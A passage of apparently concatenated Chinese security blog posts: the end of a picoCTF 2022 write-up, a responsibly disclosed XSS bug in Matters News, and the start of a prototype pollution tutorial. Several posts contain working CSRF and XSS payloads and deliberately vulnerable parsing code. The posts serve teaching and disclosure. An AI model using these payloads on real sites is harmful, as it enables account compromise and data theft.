'ctf&#123;flag&#125;'); await Promise.all([ page.click('[type=\"submit\"]'), page.waitForNavigation(&#123; waituntil: 'domcontentloaded' &#125;) ]); await page.goto('about:blank') await page.goto(url); await page.waitForTimeout(7500); await browser.close(); &#125; catch(e) &#123; console.error(e); try &#123; await browser.close() &#125; catch(e) &#123;&#125; &#125; module.exports.open = false; &#125; module.exports = &#123; open: false, run &#125; 題目敘述有說這題的 admin bot 沒有對外連線的功能，所以增加了一些額外的難度（不過其實有開就是了，看 discord 好像開賽前加回去了）。 不過這點先不討論，先來討論其他的。 這題有 csrf token 來防止 csrf，但登入的部分沒有，所以可以用 csrf 來登入，就可以順利在 admin 上執行 XSS。 如果 same site cookie 沒設定的話，其實就 iframe 一下很容易，像這樣： &lt;iframe name=f onload=run() src=\"http://0.0.0.0:8080/notes\">&lt;/iframe> &lt;form id=form action=\"/login\" target=\"_blank\"> &lt;input name=\"username\" value=\"user01\"> &lt;input name=\"password\" value=\"password\"> &lt;/form> &lt;script> function run() &#123; form.submit(); &#125; &lt;/script> 先在頁面上面開好 iframe，裡面就會有 admin 的筆記，然後用 form csrf 一下，新開一個視窗出來。 接著只要在自己的帳號裡面弄出 XSS，用 window.opener.frames[&#39;f&#39;].document.body 就可以拿到頁面的內容了， 雖然新開啟的頁面跟 window.opener 不同源，但因為跟 window.opener.frames[&#39;f&#39;] 同源所以沒差，一樣可以存取到。 不過這題的最大問題是 Chrome 預設的 default Lax，所以 iframe 不會帶 cookie，就沒辦法用了。 一個很直觀的解法是改用 window.open 來做，像這樣： &lt;form id=form action=\"/login\" target=\"_blank\"> &lt;input name=\"username\" value=\"user01\"> &lt;input name=\"password\" value=\"password\"> &lt;/form> &lt;script> win = window.open('http://0.0.0.0:8080/notes') form.submit() &lt;/script> 但最大的問題是，在新開的視窗中沒辦法用 window.opener.win 來存取到開啟的 window，因為跟 window.opener 不同源，所以不讓你存取上面的東西。 如果兩個新開的 window 彼此間不能溝通，這該怎麼辦呢？ 想了一陣子之後，突然靈機一動：「那就直接把 window.opener 變成要拿的頁面不就好了？」 像這樣： &lt;form id=form action=\"/login\" target=\"_blank\"> &lt;input name=\"username\" value=\"user01\"> &lt;input name=\"password\" value=\"password\"> &lt;/form> &lt;script> form.submit() location = 'http://0.0.0.0:8080/notes' &lt;/script> 有種 race condition 的感覺，表單送出之後立刻跳轉頁面，這時候因為新的登入還沒完成，所以跳過去時還是 admin 的 session，因此在新的視窗登入完成後就可以直接拿 window.opener.document 的東西。 如果有連網的話，就樣就完成了。在沒有對外連線的情況下，可以發現 admin bot 沒有檢查網址，所以可以傳 javascript: 或是 data: 之類的東西給它，回傳 flag 的部分可以直接用新增筆記的方式。 讓 admin bot 訪問底下這段，其實就只是用 data:text/html 載入 html 而已： data:text&#x2F;html,&lt;form id&#x3D;f method&#x3D;POST action&#x3D;http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;login target&#x3D;new_window&gt;&lt;input name&#x3D;username value&#x3D;user01&gt;&lt;input name&#x3D;password value&#x3D;password&gt;&lt;&#x2F;form&gt;&lt;script&gt;f.submit();location&#x3D;&#39;http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;notes&#39;&lt;&#x2F;script&gt; XSS payload，這邊直接新開一個 window 去做就好，也可以用 iframe 來做 &lt;script> setTimeout(() => &#123; var flag = window.opener.document.body.innerText var win = window.open('/new'); setTimeout(() => &#123; win.document.querySelector('textarea[name=content]').value = flag; win.document.querySelector('form').submit() &#125;, 2000) &#125;, 2000) &lt;/script> 另一種解法運用我前幾天在 iframe 與 window.open 黑魔法學到的招數，也就是「當開啟同名 window 時會拿到 reference，不會新開 window」，這樣兩個新開的 window 就可以互相溝通了。 &lt;form id=form action=\"/login\" target=\"_blank\"> &lt;input name=\"username\" value=\"user01\"> &lt;input name=\"password\" value=\"password\"> &lt;/form> &lt;script> window.open('http://0.0.0.0:8080/notes', 'flag') form.submit() &lt;/script> XSS 的部份這樣寫： &lt;script> var flagWin = window.open('xxx:abdef', 'flag') setTimeout(() => &#123; var flag = flagWin.document.body.innerText var win = window.open('/new'); setTimeout(() => &#123; win.document.querySelector('textarea[name=content]').value = flag; win.document.querySelector('form').submit() &#125;, 2000) &#125;, 2000) &lt;/script> 這篇也用了類似的解法：https://github.com/Scoder12/ctf/blob/main/PicoCTF%202022/web_noted.md Live Art連結：https://play.picoctf.org/practice/challenge/277?page=1&amp;search=live 這題我還沒有自己重現過，解法都是從這篇 picoCTF 2022 WriteUps 看來的，簡單記一下，主要的漏洞有兩個。 component 切換不當造成的 props 混淆 利用 is 屬性攻擊 React 第二點特別有趣，所以這邊特別講一下第二點。 請問底下的 React app 有什麼問題？ export default function App() &#123; const params = new URLSearchParams(location.search); let obj = &#123;&#125;; params.forEach(function (value, key) &#123; obj[key] = value; &#125;); return ( &lt;div className=\"App\"> &lt;h1>Demo&lt;/h1> &lt;img &#123;...obj&#125; /> &lt;/div> ); &#125; 這邊就只是把網址列上的 query string 變成 object 後丟進 img 去，URLSearchParams 預設的用法沒支援 array 跟 object，所以想產生 dangerouslySetInnerHTML: &#123; __html: &#39;..&#39;&#125; 是不可能的。 換句話說，今天如果可以控制 React render 中元素的 props，但是 value 只能是字串，可以做些什麼？ 當 React 在設置屬性時，如果你寫 &lt;img onError=&quot;alert(1)&quot;&gt;，會跳出錯誤訊息： Expected &#96;onError&#96; listener to be a function, instead got a value of &#96;string&#96; type. 改成小寫的版本，則是會跳 warning： Warning: Invalid event handler property onerror. Did you mean onError? 相關的檢查都在這邊：https://github.com/facebook/react/blob/v18.0.0/packages/react-dom/src/shared/ReactDOMUnknownPropertyHook.js#L275 export function validateProperties(type, props, eventRegistry) &#123; if (isCustomComponent(type, props)) &#123; return; &#125; warnUnknownProperties(type, props, eventRegistry); &#125; 而這邊可以注意到有個 isCustomComponent 的判斷，程式碼在這：https://github.com/facebook/react/blob/v18.0.0/packages/react-dom/src/shared/isCustomComponent.js function isCustomComponent(tagName: string, props: Object) &#123; if (tagName.indexOf('-') === -1) &#123; return typeof props.is === 'string'; &#125; switch (tagName) &#123; // These are reserved SVG and MathML elements. // We don't mind this list too much because we expect it to never grow. // The alternative is to track the namespace in a few places which is convoluted. // https://w3c.github.io/webcomponents/spec/custom/#custom-elements-core-concepts case 'annotation-xml': case 'color-profile': case 'font-face': case 'font-face-src': case 'font-face-uri': case 'font-face-format': case 'font-face-name': case 'missing-glyph': return false; default: return true; &#125; &#125; 只要 props 內的 is 是字串的話，就會是 true。 而 React 在設置屬性時也會有一些檢查：https://github.com/facebook/react/blob/v18.0.0/packages/react-dom/src/client/DOMPropertyOperations.js#L151 簡單來說，如果是 custom element（props.is 是個字串）的話，很多屬性都會直接設定上去。 所以，如果有底下的程式碼： function App() &#123; return ( &lt;img src=\"x\" onerror=\"alert(1)\" is=\"abc\" /> ) &#125; 就可以觸發 XSS！因為 is 的緣故，讓 React 直接設置了 onerror 的屬性。 我好興奮啊！寫 React 這麼久第一次知道這個特性，在攻擊 React app 上又多了一個攻擊面。","link":"/2022/04/10/picoctf-2022-writeup/"},{"title":"防止 XSS 可能比想像中困難","text":"前言如果你不知道什麼是 XSS（Cross-site Scripting），簡單來說就是駭客可以在你的網站上面執行 JavaScript 的程式碼。既然可以執行，那就有可能可以把使用者的 token 偷走，假造使用者的身份登入，就算偷不走 token，也可以竄改頁面內容，或是把使用者導到釣魚網站等等。 要防止 XSS，就必須阻止駭客在網站上面執行程式碼，而防禦的方式有很多，例如說可以透過 CSP（Content-Security-Policy）這個 HTTP response header 防止 inline script 的執行或是限制可以載入 script 的 domain，也可以用 Trusted Types 防止一些潛在的攻擊以及指定規則，或是使用一些過濾 XSS 的 library，例如說 DOMPurify 以及 js-xss。 但是用了這些就能沒事了嗎？是也不是。 如果使用正確那當然沒有問題，但若是有用可是設定錯誤的話，還是有可能存在 XSS 的漏洞。 前陣子我剛從公司內轉到一個做資安的團隊 Cymetrics，在對一些網站做研究的時候發現了一個現成的案例，因此這篇就以這個現成的案例來說明怎樣叫做錯誤的設定，而這個設定又會帶來什麼樣的影響。 錯誤的設定，意料之外的結果Matters News 是一個去中心化的寫作社群平台，而且所有的程式碼都有開源！ 像是這種部落格平台，我最喜歡看的是他們怎麼處理內容的過濾，秉持著好奇跟研究的心態，可以來看看他們在文章跟評論的部分是怎麼做的。 Server 過濾的程式碼在這邊：matters-server&#x2F;src&#x2F;common&#x2F;utils&#x2F;xss.ts： import xss from 'xss' const CUSTOM_WHITE_LISTS = &#123; a: [...(xss.whiteList.a || []), 'class'], figure: [], figcaption: [], source: ['src', 'type'], iframe: ['src', 'frameborder', 'allowfullscreen', 'sandbox'], &#125; const onIgnoreTagAttr = (tag: string, name: string, value: string) => &#123; /** * Allow attributes of whitelist tags start with \"data-\" or \"class\" * * @see https://github.com/leizongmin/js-xss#allow-attributes-of-whitelist-tags-start-with-data- */ if (name.substr(0, 5) === 'data-' || name.substr(0, 5) === 'class') &#123; // escape its value using built-in escapeAttrValue function return name + '=\"' + xss.escapeAttrValue(value) + '\"' &#125; &#125; const ignoreTagProcessor = ( tag: string, html: string, options: &#123; [key: string]: any &#125; ) => &#123; if (tag === 'input' || tag === 'textarea') &#123; return '' &#125; &#125; const xssOptions = &#123; whiteList: &#123; ...xss.whiteList, ...CUSTOM_WHITE_LISTS &#125;, onIgnoreTagAttr, onIgnoreTag: ignoreTagProcessor, &#125; const customXSS = new xss.FilterXSS(xssOptions) export const sanitize = (string: string) => customXSS.process(string) 這邊比較值得注意的是這一段： const CUSTOM_WHITE_LISTS = &#123; a: [...(xss.whiteList.a || []), 'class'], figure: [], figcaption: [], source: ['src', 'type'], iframe: ['src', 'frameborder', 'allowfullscreen', 'sandbox'], &#125; 這一段就是允許被使用的 tag 跟屬性，而屬性的內容也會被過濾。例如說雖然允許 iframe 跟 src 屬性，但是 &lt;iframe src=&quot;javascript:alert(1)&quot;&gt; 是行不通的，因為這種 javascript: 開頭的 src 會被過濾掉。 只看 server side 的沒有用，還需要看 client side 那邊是怎麼 render 的。 對於文章的顯示是這樣的：src&#x2F;views&#x2F;ArticleDetail&#x2F;Content&#x2F;index.tsx） &lt;> &lt;div className=&#123;classNames(&#123; 'u-content': true, translating &#125;)&#125; dangerouslySetInnerHTML=&#123;&#123; __html: optimizeEmbed(translation || article.content), &#125;&#125; onClick=&#123;captureClicks&#125; ref=&#123;contentContainer&#125; /> &lt;style jsx>&#123;styles&#125;&lt;/style> &lt;/> Matters 的前端使用的是 React，在 React 裡面所 render 的東西預設都已經 escape 過了，所以基本上不會有 XSS 的洞。但有時候我們不想要它過濾，例如說文章內容，我們可能會需要一些 tag 可以 render 成 HTML，這時候就可以用 dangerouslySetInnerHTML，傳入這個的東西會直接以 innerHTML 的方式 render 出來，不會被過濾。 所以一般來說都會採用 js-xss + dangerouslySetInnerHTML 這樣的做法，確保 render 的內容儘管是 HTML，但不會被 XSS。 這邊在傳入 dangerouslySetInnerHTML 之前先過了一個叫做 optimizeEmbed 的函式，可以繼續往下追，看到 src&#x2F;common&#x2F;utils&#x2F;text.ts： export const optimizeEmbed = (content: string) => &#123; return content .replace(/\\&lt;iframe /g, '&lt;iframe loading=\"lazy\"') .replace( /&lt;img\\s[^>]*?src\\s*=\\s*['\\\"]([^'\\\"]*?)['\\\"][^>]*?>/g, (match, src, offset) => &#123; return /* html */ ` &lt;picture> &lt;source type=\"image/webp\" media=\"(min-width: 768px)\" srcSet=$&#123;toSizedImageURL(&#123; url: src, size: '1080w', ext: 'webp' &#125;)&#125; onerror=\"this.srcset='$&#123;src&#125;'\" /> &lt;source media=\"(min-width: 768px)\" srcSet=$&#123;toSizedImageURL(&#123; url: src, size: '1080w' &#125;)&#125; onerror=\"this.srcset='$&#123;src&#125;'\" /> &lt;source type=\"image/webp\" srcSet=$&#123;toSizedImageURL(&#123; url: src, size: '540w', ext: 'webp' &#125;)&#125; /> &lt;img src=$&#123;src&#125; srcSet=$&#123;toSizedImageURL(&#123; url: src, size: '540w' &#125;)&#125; loading=\"lazy\" /> &lt;/picture> ` &#125; ) &#125; 這邊採用 RegExp 把 img src 拿出來，然後用字串拼接的方式直接拼成 HTML，再往下看 toSizedImageURL： export const toSizedImageURL = (&#123; url, size, ext &#125;: ToSizedImageURLProps) => &#123; const assetDomain = process.env.NEXT_PUBLIC_ASSET_DOMAIN ? `https://$&#123;process.env.NEXT_PUBLIC_ASSET_DOMAIN&#125;` : '' const isOutsideLink = url.indexOf(assetDomain) &lt; 0 const isGIF = /gif/i.test(url) if (!assetDomain || isOutsideLink || isGIF) &#123; return url &#125; const key = url.replace(assetDomain, ``) const extedUrl = changeExt(&#123; key, ext &#125;) const prefix = size ? '/' + PROCESSED_PREFIX + '/' + size : '' return assetDomain + prefix + extedUrl &#125; 只要 domain 是 assets 的 domain 並符合其他條件，就會經過一些字串處理之後回傳。 看到這邊，就大致上了解整個文章的 render 過程了。 會在 server side 用 js-xss 這套 library 進行過濾，在 client side 這邊則是用 dangerouslySetInnerHTML 來 render，其中會先對 img tag 做一些處理，把 img 改成用 picture + source 的方式針對不同解析度或是螢幕尺寸載入不同的圖片。 以上就是這個網站 render 文章的整個過程，再繼續往下看之前你可以想一下，有沒有什麼地方有問題？ &#x3D;&#x3D; 防雷分隔 &#x3D;&#x3D;&#x3D;&#x3D; 防雷分隔 &#x3D;&#x3D;&#x3D;&#x3D; 防雷分隔 &#x3D;&#x3D;&#x3D;&#x3D; 防雷分隔 &#x3D;&#x3D;&#x3D;&#x3D; 防雷分隔 &#x3D;&#x3D;&#x3D;&#x3D; 防雷分隔 &#x3D;&#x3D;&#x3D;&#x3D; 防雷分隔 &#x3D;&#x3D;&#x3D;&#x3D; 防雷分隔 &#x3D;&#x3D;&#x3D;&#x3D; 防雷分隔 &#x3D;&#x3D;&#x3D;&#x3D; 防雷分隔 &#x3D;&#x3D;&#x3D;&#x3D; 防雷分隔 &#x3D;&#x3D;&#x3D;&#x3D; 防雷分隔 &#x3D;&#x3D;&#x3D;&#x3D; 防雷分隔 &#x3D;&#x3D;&#x3D;&#x3D; 防雷分隔 &#x3D;&#x3D;&#x3D;&#x3D; 防雷分隔 &#x3D;&#x3D; 第一個問題：錯誤的屬性過濾你有發現這邊的過濾有問題嗎？ const CUSTOM_WHITE_LISTS = &#123; a: [...(xss.whiteList.a || []), 'class'], figure: [], figcaption: [], source: ['src', 'type'], iframe: ['src', 'frameborder', 'allowfullscreen', 'sandbox'], &#125; 開放 iframe 應該是因為要讓使用者可以嵌入 YouTube 影片之類的東西，但問題是這個網站並沒有用 CSP 指定合法的 domain，因此這邊的 src 可以隨意亂填，我可以自己做一個網站然後用 iframe 嵌入。如果網頁內容設計得好，看起來就會是這個網站本身的一部分： 以上只是隨便填的一個範例，主要是讓大家看個感覺，如果真的有心想攻擊的話可以弄得更精緻，內容更吸引人。 如果只是這樣的話，攻擊能否成功取決與內容是否能夠取信於使用者。但其實可以做到的不只這樣，大家知道在 iframe 裡面是可以操控外面的網站嗎？ cross origin 的 window 之間能存取的東西有限，唯一能夠改變的是 location 這個東西，意思就是我們可以在 iframe 裡面，把嵌入你的網站重新導向： &lt;script> top.location = 'https://google.com' &lt;/script> 這樣做的話，我就可以把整個網站重新導向到任何地方，一個最簡單能想到的應用就是重新導向到釣魚網站。這樣的釣魚網站成功機率是比較高的，因為使用者可能根本沒有意識到他被重新導向到其他網站了。 其實瀏覽器針對這樣的重新導向是有防禦的，上面的程式碼會出現錯誤： Unsafe attempt to initiate navigation for frame with origin ‘https://matters.news‘ from frame with URL ‘https://53469602917d.ngrok.io/‘. The frame attempting navigation is targeting its top-level window, but is neither same-origin with its target nor has it received a user gesture. See https://www.chromestatus.com/features/5851021045661696. Uncaught DOMException: Failed to set the ‘href’ property on ‘Location’: The current window does not have permission to navigate the target frame to ‘https://google.com‘ 因為不是 same origin，所以會阻止 iframe 對 top level window 做導向。 但是呢！這個東西是可以繞過的，會運用到 sandbox 這個屬性。這個屬性其實就是在指定嵌入的 iframe 有什麼權限，所以只要改成：&lt;iframe sandbox=&quot;allow-top-navigation allow-scripts allow-same-origin&quot; src=example.com&gt;&lt;/iframe&gt;，就可以成功對 top level window 重新導向，把整個網站給導走。 這個漏洞在 GitLab 與 codimd 都有出現過。 這邊的修正方式有幾個，第一個是可以先把 sandbox 這個屬性拿掉，讓這個屬性不能被使用。如果真的有地方需要用到的話，就需要檢查裡面的值，把比較危險的 allow-top-navigation 給拿掉。 再來的話也可以限制 iframe src 的位置，可以在不同層面做掉，例如說在程式碼裡面自己過濾 src，只允許特定 domain，或者是用 CSP:frame-src 讓瀏覽器把這些不符合的 domain 自己擋掉。 第二個問題：未過濾的 HTML第一個問題能造成最大的危險大概就是重新導向了（codimd 那一篇是說在 Safari 可以做出 XSS 啦，只是我做不出來 QQ），但是除了這個之外，還有一個更大的問題，那就是這邊： &lt;> &lt;div className=&#123;classNames(&#123; 'u-content': true, translating &#125;)&#125; dangerouslySetInnerHTML=&#123;&#123; __html: optimizeEmbed(translation || article.content), &#125;&#125; onClick=&#123;captureClicks&#125; ref=&#123;contentContainer&#125; /> &lt;style jsx>&#123;styles&#125;&lt;/style> &lt;/> article.content 是經過 js-xss 過濾後的 HTML 字串，所以是安全的，但這邊經過了一個 optimizeEmbed 去做自訂的轉換，在過濾以後還去改變內容其實是一件比較危險的事，因為如果處理的過程有疏忽，就會造成 XSS 的漏洞。 在轉換裡面有一段程式碼為： &lt;source type=\"image/webp\" media=\"(min-width: 768px)\" srcSet=$&#123;toSizedImageURL(&#123; url: src, size: '1080w', ext: 'webp' &#125;)&#125; onerror=\"this.srcset='$&#123;src&#125;'\" /> 仔細看這段程式碼，如果 $&#123;toSizedImageURL(&#123; url: src, size: &#39;1080w&#39;, ext: &#39;webp&#39; &#125;)&#125; 或是 src 我們可以控制的話，就有機會能夠改變屬性的內容，或者是新增屬性上去。 我原本想插入一個惡意的 src 讓 onerror 變成 onerror=&quot;this.srcset=&#39;test&#39;;alert(1)&quot; 之類的程式碼，但我後來發現 picture 底下的 source 的 onerror 事件好像是無效的，就算 srcset 有錯也不會觸發，所以是沒用的。 因此我就把焦點轉向 srcSet 以及插入新的屬性，這邊可以用 onanimationstart 這個屬性，在 animation 開始時會觸發的一個事件，而 animation 的名字可以去 CSS 裡面找，很幸運地找到了一個 keyframe 叫做spinning。 因此如果 img src 為：https://assets.matters.news/processed/1080w/embed/test style=animation-name:spinning onanimationstart=console.log(1337) 結合後的程式碼就是： &lt;source type=\"image/webp\" media=\"(min-width: 768px)\" srcSet=https://assets.matters.news/processed/1080w/embed/test style=animation-name:spinning onanimationstart=console.log(1337) onerror=\"this.srcset='$&#123;src&#125;'\" /> 如此一來，就製造了一個 XSS 的漏洞： 修補方式也有幾個： 新增 CSP header 阻止 inline script 的執行（這比較難做到，因為可能會跟現有東西牴觸，需要較多時間處理） 過濾傳進來的 img url（如果過濾不好一樣有風險） 先改變 HTML，才去呼叫 js-xss 幫你濾掉不該存在的屬性 總結我們找到了兩個漏洞： 透過 &lt;iframe&gt; 把使用者導到任意位置 透過 &lt;source&gt; 執行文章頁面的 XSS 攻擊 那實際上到底可以做到什麼樣的攻擊呢？ 可以先用第二個漏洞發表一篇有 XSS 攻擊的文章，再寫一個機器人去所有文章底下留言，利用 &lt;iframe&gt; 把使用者導到具有 XSS 的文章。如此一來，只要使用者點擊任何一篇文章都會被攻擊到。 不過網站本身其他地方的防禦做得不錯，儘管有 XSS 但 Cookie 是 HttpOnly 的所以偷不走，修改密碼是用寄信的所以也沒辦法修改密碼，似乎沒辦法做到真的太嚴重的事情。 許多過濾 XSS 的 library 本身是安全的（雖然有些時候其實還是會被發現漏洞），但使用 library 的人可能忽略了一些設定或者是額外做了一些事情，導致最後產生出來的 HTML 依然是不安全的。 在處理與使用者輸入相關的地方時，應該對於每一個環節都重新檢視一遍，看看是否有疏忽的地方。 CSP 的 header 也建議設定一下，至少在真的被 XSS 時還有最後一道防線擋住。雖然說 CSP 有些規則也可以被繞過，但至少比什麼都沒有好。 Matters 有自己的 Bug Bounty Program，只要找到能證明危害的漏洞都有獎金可以拿，這篇找到的 XSS 漏洞被歸類在 High，價值 150 元美金。他們團隊相信開源能惠及技術人員，也能讓網站更安全，因此希望大家知道這個計畫的存在。 最後，感謝 Matters 團隊快速的回覆以及處理，也感謝 Cymetrics 的同事們。 時間軸： 2021–05–07 回報漏洞 2021–05–12 收到 Matters 團隊確認信，正在修補漏洞 2021–05–12 詢問修補完是否能發表文章，獲得許可 2021–05–13 修復完成","link":"/2021/05/25/prevent-xss-is-not-that-easy/"},{"title":"基於 JS 原型鏈的攻擊手法：Prototype Pollution","text":"前言 身為一個前端工程師，或是一個會寫 JavaScript 的人，你一定多少有聽過 prototype 這個名詞，甚至面試的時候也會考到相關的題目。 但你可能沒聽過的是，在 JavaScript 中有一種攻擊手法跟原型鏈息息相關，利用原型鏈這個功能的特性來進行攻擊——Prototype pollution，通常翻做原型鏈污染，就是這麼有趣而且破壞力十足的一個攻擊手法。 原型鏈JavaScript 中的物件導向跟其他程式語言比較不一樣，你現在看到的 class 那是 ES6 以後才有的語法，在這之前都是用 prototype 來做這件事情，又稱為原型繼承。 舉個例子好了，你有沒有想過當你在用一些內建函式的時候，這些函式是從哪裡來的？ var str = \"a\" var str2 = str.repeat(5) // repeat 是哪裡來的？ 甚至你會發現，兩個不同字串的 repeat 方法，其實是同一個 function： var str = \"a\" var str2 = \"b\" console.log(str.repeat === str2.repeat) // true 或是如果你曾經查過 MDN，會發現標題不是 repeat，而是 String.prototype.repeat： 而這一切的一切，都與 prototype 有關。 當你在呼叫 str.repeat 的時候，並不是 str 這個 instance 上面真的有一個方法叫做 repeat，那既然如此，JS 引擎背後是怎麼運作的？ 還記得 scope 的概念嗎？假設我用了一個變數，local scope 找不到，JS 引擎就會去上一層 scope 找，然後一路找到 global scope 為止，這又稱為 scope chain，JS 引擎沿著這條鏈不斷往上尋找，直到最頂端才停下來。 Prototype chain 的概念其實是一模一樣的，但差別在於：「JS 引擎怎麼知道上一層是哪裡？」，如果 JS 引擎在 str 身上找不到 repeat 這個 function，那它該去哪裡找呢？ 在 JS 中有一個隱藏的屬性，叫做 __proto__，它儲存的值就是 JS 引擎應該往上找的地方。 例如說： var str = \"\" console.log(str.__proto__) // String.prototype str.__proto__ 所指向的東西，就是 JS 引擎在 str 身上找不到東西時，應該去的「上一層」，而這個上一層會是 String.prototype。 這解釋了為什麼 MDN 上面不寫 repeat，而是寫 String.prototype.repeat，因為這才是 repeat function 的全名，這個 repeat 函式其實是存在於 String.prototype 這個物件上的一個方法。 因此，當你在呼叫 str.repeat 的時候，其實就是在呼叫 String.prototype.repeat，而這就是原型鏈的原理跟運作方式。 除了字串以外，其他東西也是一樣的，例如說物件： var obj = &#123;&#125; console.log(obj.a) // undefined console.log(obj.toString) // ƒ toString() &#123; [native code] &#125; 明明 obj 就是一個空物件，為什麼 obj.toString 有東西？因為 JS 引擎在 obj 找不到，所以就去 obj.__proto__ 找，而這個 obj.__proto__ 所指向的地方是 Object.prototype，所以 obj.toString 最後找到的其實是 Object.prototype.toString。 var obj = &#123;&#125; console.log(obj.toString === Object.prototype.toString) // true 改變預設 prototype 上的屬性字串的 __proto__ 會是 String.prototype，數字的 __proto__ 會是 Number.prototype，而陣列的則是 Array.prototype，這些關聯都是已經預設好的了，原因就是要讓這些類別的東西可以共用同一個 function。 如果每一個字串都有自己的 repeat，那一百萬個字串就有一百萬個不同的 repeat，但其實做的事情都一樣，聽起來不太合理對吧？所以透過 prototype ，我們就可以把 repeat 放在 String.prototype，這樣每個字串在使用這個函式時，呼叫到的都會是同一個函式。 你可能會好奇說，既然呼叫到的是同個函式，參數也都一樣，那函式要怎麼區分出是不同的字串在呼叫它？ 答案就是：this，底下直接看個例子： String.prototype.first = function() &#123; return this[0] &#125; console.log(\"\".first()) // undefined console.log(\"abc\".first()) // a 首先，我在 String.prototype 上面加了一個方法叫做 first，所以當我呼叫 &quot;&quot;.first 的時候，JS 引擎沿著 __proto__ 找到了 String.prototype，發現了 String.prototype.first 是存在的，就呼叫了這個函式。 而又因為 this 的規則，當 &quot;&quot;.first() 這樣寫的時候，在 first 中拿到的 this 會是 &quot;&quot;；若呼叫的是 &quot;abc&quot;.first()，first 中拿到的 this 就會是 &quot;abc&quot;，因此我們可以用 this 來區分現在是誰在呼叫。 像上面那樣 String.prototype.first 的寫法，就是直接去修改 String 的原型，加上一個新的方法，讓所有字串都可以用到這個新的 method。雖然很方便沒錯，但是這樣的方式在開發上是不被推薦的，有一句話是這樣說的：Don’t modify objects you don’t own。例如說 MooTools 就因為做了類似的事情，導致一個 array 的 method 要換名稱，詳情請看我以前寫過的：Don’t break the Web：以 SmooshGate 以及 為例。 然後，既然 String.prototype 可以修改，那理所當然 Object.prototype 也可以修改，像是這樣： Object.prototype.a = 123 var obj = &#123;&#125; console.log(obj.a) // 123 因為修改了 Object.prototype 的緣故，所以在存取 obj.a 的時候，JS 引擎在 obj 身上找不到 a 這個屬性，於是去 obj.__proto__ 也就是 Object.prototype 找，在那上面找到了 a，於是就回傳這個 a 的值。 當程式出現漏洞，導致可以被攻擊者拿去改變原型鏈上的屬性，就叫做 prototype pollution。Pollution 是污染的意思，就像上面這個 object 的例子，我們透過 Object.prototype.a = 123 「污染」了物件原型上的 a 這個屬性，導致程式在存取物件時，有可能出現意想不到的行為。 那這會造成什麼後果呢？ 污染了屬性以後可以幹嘛？假設今天網站上有個搜尋功能，會從 query string 裡面拿 q 的值，然後寫到畫面上去，呈現出來像是這樣： 而整段程式碼是這樣寫的： // 從網址列上拿到 query string var qs = new URLSearchParams(location.search.slice(1)) // 放上畫面，為了避免 XSS 用 innerText document.body.appendChild(createElement(&#123; tag: 'h2', innerText: `Search result for $&#123;qs.get('q')&#125;` &#125;)) // 簡化建立元件用的函式 function createElement(config)&#123; const element = document.createElement(config.tag) if (config.innerHTML) &#123; element.innerHTML = config.innerHTML &#125; else &#123; element.innerText = config.innerText &#125; return element &#125; 上面這段程式碼應該沒什麼問題對吧？我們寫了一個 function createElement 幫我們簡化一些步驟，根據傳進來的 config 決定要產生什麼元件。為了避免 XSS，所以我們用 innerText 而不是 innerHTML，萬無一失，絕對不會有 XSS！ 看起來是這樣沒錯，但如果在執行到這一段程式碼以前有個 prototype pollution 的漏洞，能讓攻擊者污染到原型上的屬性呢？例如說像是這樣： // 先假設可以污染原型上的屬性 Object.prototype.innerHTML = '&lt;img src=x onerror=alert(1)>' // 底下都跟剛剛一樣 var qs = new URLSearchParams(location.search.slice(1)) document.body.appendChild(createElement(&#123; tag: 'h2', innerText: `Search result for $&#123;qs.get('q')&#125;` &#125;)) function createElement(config)&#123; const element = document.createElement(config.tag) // 這一行因為原型鏈被污染，所以 if(config.innerHTML) 的結果會是 true if (config.innerHTML) &#123; element.innerHTML = config.innerHTML &#125; else &#123; element.innerText = config.innerText &#125; return element &#125; 整份程式碼只差在開頭，多了一個 Object.prototype.innerHTML = &#39;&lt;img src=x onerror=alert(1)&gt;&#39;，而就因為這一行污染了 innerHTML，導致底下 if (config.innerHTML) &#123; 的判斷變成 true，行為被改變，原本是用 innerText，現在改成用 innerHTML，最後就達成了 XSS！ 這就是由 prototype pollution 所引發的 XSS 攻擊。一般來說，prototype pollution 指的是程式有漏洞，導致攻擊者可以污染原型鏈上的屬性，但是除了污染以外，還必須找到可以影響的地方，加在一起才能形成完整的攻擊。 此時的你應該很好奇，那到底怎樣的程式碼會有漏洞，居然能讓攻擊者去改原型鏈上的屬性。 Prototype pollution 是怎麼發生的？有兩個例子很常發生這種事情，第一個是解析 query string。 你可能想說 query string 不就 ?a=1&amp;b=2 這種類型，有什麼難的？但其實許多函式庫的 query string 都有支援陣列，像是 ?a=1&amp;a=2 或是 ?a[]=1&amp;a[]=2 都有可能被解析為陣列。 除了陣列以外，有些甚至還支援物件，像是這樣：?a[b][c]=1，就會產生一個 &#123;a: &#123;b: &#123;c: 1&#125;&#125;&#125; 的物件出來。 舉例來說，qs 這個 library 就有支援物件的解析。 今天如果是你要來負責這個功能，你會怎麼寫呢？我們可以寫一個只針對物件的陽春版本（先不考慮 URL encode 的情況，也不考慮陣列）： function parseQs(qs) &#123; let result = &#123;&#125; let arr = qs.split('&amp;') for(let item of arr) &#123; let [key, value] = item.split('=') if (!key.endsWith(']')) &#123; // 針對一般的 key=value result[key] = value continue &#125; // 針對物件 let items = key.split('[') let obj = result for(let i = 0; i &lt; items.length; i++) &#123; let objKey = items[i].replace(/]$/g, '') if (i === items.length - 1) &#123; obj[objKey] = value &#125; else &#123; if (typeof obj[objKey] !== 'object') &#123; obj[objKey] = &#123;&#125; &#125; obj = obj[objKey] &#125; &#125; &#125; return result &#125; var qs = parseQs('test=1&amp;a[b][c]=2') console.log(qs) // &#123; test: '1', a: &#123; b: &#123; c: '2' &#125; &#125; &#125; 基本上就是根據 [] 裡面的內容去構造出一個物件，一層一層去賦值，看起來沒什麼特別的。 但是！如果我的 query string 長這樣，事情就不一樣了： var qs = parseQs('__proto__[a]=3') console.log(qs) // &#123;&#125; var obj = &#123;&#125; console.log(obj.a) // 3 當我的 query string 是這樣的時候，parseQs 就會去改變 obj.__proto__.a 的值，造成了 prototype pollution，導致我後來宣告一個空的物件，在印出 obj.a 的時候卻印出了 3，因為物件原型已經被污染了。 有不少在解析 query string 的 library 都出過類似的問題，底下簡單舉幾個例子： jquery-deparam backbone-query-parameters jquery-query-object 除了解析 query string 以外，另一個功能也很常發生這個問題，叫做合併物件，一個簡單的合併物件函式長得像這樣： function merge(a, b) &#123; for(let prop in b) &#123; if (typeof a[prop] === 'object') &#123; merge(a[prop], b[prop]) &#125; else &#123; a[prop] = b[prop] &#125; &#125; 